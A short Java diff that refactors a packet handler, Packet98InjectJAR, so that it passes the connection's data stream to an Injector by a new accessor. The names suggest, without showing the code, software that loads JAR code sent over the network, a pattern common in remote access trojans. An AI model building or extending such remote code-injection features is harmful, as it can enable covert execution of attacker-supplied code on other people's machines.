@@ -8,7 +8,7 @@ public class Packet98InjectJAR extends AbstractIncomingPacket {
 	@Override
 	public void read() throws Exception {
 		Injector i = new Injector();
-		i.inject(Connection.dis);
+		i.inject(Connection.instance.getDataInputStream());
 	}
 
 }
